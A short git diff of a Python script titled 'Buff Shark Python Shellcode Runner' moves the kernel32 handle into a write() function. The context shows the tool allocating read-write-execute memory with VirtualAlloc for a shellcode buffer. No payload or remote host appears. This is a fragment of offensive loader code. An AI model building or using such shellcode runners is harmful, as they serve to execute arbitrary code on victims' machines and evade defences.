@@ -9,7 +9,7 @@ import urllib.request
 
 #Buff Shark Python Shellcode Runner
 
-kernel32 = ctypes.windll.kernel32
+
 
 print("==========================")
 print("Buff Shark Shellcode Runner")
@@ -56,6 +56,7 @@ def write_linux(str1):
 
 def write(buf):
     length = len(buf)
+    kernel32 = ctypes.windll.kernel32
 
     kernel32.VirtualAlloc.restype = ctypes.c_void_p
     ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
